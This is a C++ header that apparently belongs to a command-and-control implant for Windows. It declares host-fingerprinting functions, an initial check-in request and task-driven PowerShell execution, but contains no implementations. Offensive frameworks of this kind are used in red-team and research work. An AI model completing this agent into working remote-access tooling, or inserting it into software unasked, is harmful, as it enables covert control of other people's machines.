#pragma once
#include <string>
#include "CommManager.h"
#include "TaskQueueManager.h"
#include <windows.h>

class Agent {
public:
	Agent(CommManager commManager, TaskQueueManager taskManager);
	void Start();

	// Host metadata commands 
	BOOL GetUsername(OUT LPWSTR* szWhoamiStr);
	std::string GetInternalIP();
	std::string GetExternalViaDNS();
	int GetPID();
	std::string GetProcessName();
	std::string GetMachineMacAddress();
	std::string GetMotherBoard();
	int GetRAM();
	int GetOSVersion();
	void GetTotalDiskSize(OUT double* total, OUT double* free);
	int GetCpuCount();
	IntitalCheckinRequest GetHostInformation();

	// Agent base commands
	void Exit();
	std::string GetUID();
	Response ExecutePowerShell(const TaskRequest<CommandPowershell>& psRequest);
private:
	CommManager commManager;
	TaskQueueManager taskManager;
	std::string CaptureCommandOutput(const std::string& cmd);
};